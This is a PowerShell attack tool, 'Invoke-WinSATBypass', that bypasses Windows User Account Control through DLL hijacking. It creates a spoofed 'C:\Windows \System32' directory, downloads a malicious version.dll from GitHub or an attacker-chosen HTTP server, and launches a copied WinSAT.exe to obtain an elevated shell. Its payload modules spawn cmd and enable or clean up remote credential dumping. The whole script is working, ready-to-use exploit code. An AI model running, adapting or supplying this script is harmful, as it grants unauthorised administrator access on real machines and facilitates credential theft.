function Invoke-WinSATBypass
{
    [CmdletBinding()] param (
    [Parameter()] [String] $HTTPServerIP,
    [Parameter()] [String] $Payload,
    [Parameter()] [String] $List,
    [Parameter()] [String] $Help
    )


    $banner = @”


    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █▄░▄█░▄▄▀█▀███▀█▀▄▄▀█░█▀█░▄▄█████░███░██▄██░▄▄▀██░▄▄▄░█░▄▄▀█▄▄░▄▄██░▄▄▀█░██░█▀▄▄▀█░▄▄▀█░▄▄█░▄▄
    ██░██░██░██░▀░██░██░█░▄▀█░▄▄█▄▄██░█░█░██░▄█░██░██▄▄▄▀▀█░▀▀░███░████░▄▄▀█░▀▀░█░▀▀░█░▀▀░█▄▄▀█▄▄▀
    █▀░▀█▄██▄███▄████▄▄██▄█▄█▄▄▄█████▄▀▄▀▄█▄▄▄█▄██▄██░▀▀▀░█░██░███░████░▀▀░█▀▀▀▄█░████▄██▄█▄▄▄█▄▄▄
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀


“@
    # If you compile your own DLL Modules, add their name and relative Path here
    # Example : DLL_MODULE_NAME = "DLL_MODULE_PATH"
    $dllModuleRepository = @{
        SpawnCMD = "/DLL-Modules/bin/SpawnCMD.dll";
        AllowRemoteCredsDump = "/DLL-Modules/bin/AllowRemoteCredsDump.dll";
        CleanRemoteCredsDump = "/DLL-Modules/bin/CleanRemoteCredsDump.dll";
    };
    
    $listOptions = @{
        Payload = "List all Payloads";
        Options = "List all Options";
    };

    function ListOptions {
        Write-Output ($listOptions.Keys | Select @{l='List Options';e={$_}},@{l='Description';e={$listOptions[$_]}});
        return;
    }

    function ListPayload {
        Write-Output ($dllModuleRepository.Keys | Select @{l='Payload';e={$_}},@{l='Location';e={$dllModuleRepository[$_]}});
        return;
    }

    $ProgressPreference = 'SilentlyContinue'
    $mockDirectory = '\\?\C:\Windows \System32';
    $uacBypass = "$mockDirectory\WinSAT.exe";
    $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";
    $downloadSucceed = $false;
    $dllModuleURL = $dllModuleRepository['SpawnCMD'];
    $dllModuleURLPrefix = "";

    Write-Output "$banner";
    
    #Checking if Listing was Invoke
    if ($List -ne '') {
        $optionFound = $false;
        foreach ($option in $listOptions.Keys) {
            if($option -eq $List) {
                $optionFound = $true;
            }
        }
        if (!$optionFound) {
            Write-Output "[-] No List option matching: $List found";
            ListOptions;
            return;
        }
        switch ($List) {
            Payload {ListPayload;}
            Options {ListOptions;}
        }
        return;
    } 
    
    if($Payload -eq $null -or $Payload -eq '') {
        $Payload = 'SpawnCMD';
        Write-Output "[-] No Payload supplied, setting to default : $Payload ";        
    }
    
    else {
        $payloadFound = $false;     
        foreach ($dll in $dllModuleRepository.Keys) {
            if($dll -eq $Payload) {
                $payloadFound = $true;
            }
        }      
        if (!$payloadFound) {
            Write-Output "[-] No Payload matching : $Payload found";
            ListPayload;
            return;
        }
    }

    $dllModuleURL = $dllModuleRepository[$Payload];

    #If no HTTPServer IP is supplied the DLL will be fetch from https://github/b4keSn4ke/
    if ($HTTPServerIP -eq $null -or $HTTPServerIP -eq '') {
        Write-Output "[-] No HTTP Server IP supplied, defaulting to https://github.com/b4keSn4ke/";
        $dllModuleURLPrefix = "https://github.com/b4keSn4ke/Invoke-WinSATBypass/raw/main";
    }
    else {
        Write-Output "[+] HTTP Server set to $HTTPServerIP";
        $dllModuleURLPrefix = "http://$HTTPServerIP";
    }

    $url = $dllModuleURLPrefix + $dllModuleURL;

    # Creates a Mock Directory that will be use for DLL Hijacking
    Write-Output "[+] Creating mock directory: $mockDirectory";
    New-Item "$mockDirectory" -ItemType Directory | Out-Null ;
    timeout 1 | Out-Null ;

    # Try to download our malicious version.dll and copying it to our mock directory
    Write-Output "[+] Fetching $Payload from: $url";
    timeout 1 | Out-Null ;

    try {
        Invoke-WebRequest ("$url") -outfile "C:\Windows \System32\version.dll";
        $downloadSucceed = $true;
    }
    catch [System.Net.WebException] {
        Write-Output "[-] Failed to fetch $Payload from: $url";
        $downloadSucceed = $false;
    }

    if ($downloadSucceed) {
        # Copies WinSAT.exe from System32 which normally loads version.dll
        Write-Output "[+] Copying WinSAT.exe in mock directory: $mockDirectory";
        cp C:\Windows\System32\WinSAT.exe "$uacBypass";
        
        # Execute WinSAT.exe and get an elevated shell
        Write-Output "[+] Launching UAC Bypass: $uacBypass";
        cmd.exe /c $uacBypassCMD;
    }

    # Removes the mock directory recursively
    Write-Output "[+] Removing mock directory: $mockDirectory";
    Remove-Item "\\?\C:\Windows \" -Recurse -Force;
}
